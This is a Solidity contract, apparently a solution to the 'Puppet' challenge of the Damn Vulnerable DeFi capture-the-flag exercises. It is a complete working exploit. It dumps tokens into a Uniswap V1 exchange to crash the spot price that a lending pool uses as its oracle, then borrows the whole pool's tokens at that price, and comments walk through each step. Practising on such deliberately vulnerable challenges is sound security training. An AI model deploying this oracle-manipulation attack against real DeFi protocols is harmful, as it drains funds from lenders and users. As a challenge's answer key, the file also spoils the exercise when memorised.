// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {PuppetPool} from "./PuppetPool.sol";
import {IUniswapV1Exchange} from "./IUniswapV1Exchange.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";

contract PuppetAttack {
    constructor(
        address _pool,
        address _exchange,
        address _token,
        address recovery,
        uint256 playerTokenBalance
    ) payable {
        PuppetPool pool = PuppetPool(_pool);
        IUniswapV1Exchange exchange = IUniswapV1Exchange(_exchange);
        DamnValuableToken token = DamnValuableToken(_token);

        // Step 1: Approve and dump all tokens into Uniswap
        // This crashes the token price
        token.approve(address(exchange), playerTokenBalance);
        exchange.tokenToEthSwapInput(
            playerTokenBalance,
            1, // min ETH out
            block.timestamp + 1 days
        );

        // Step 2: Borrow all pool tokens at crashed price
        uint256 poolBalance = token.balanceOf(_pool);
        uint256 depositRequired = pool.calculateDepositRequired(poolBalance);
        pool.borrow{value: depositRequired}(poolBalance, recovery);

        // Send any leftover ETH back to player
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
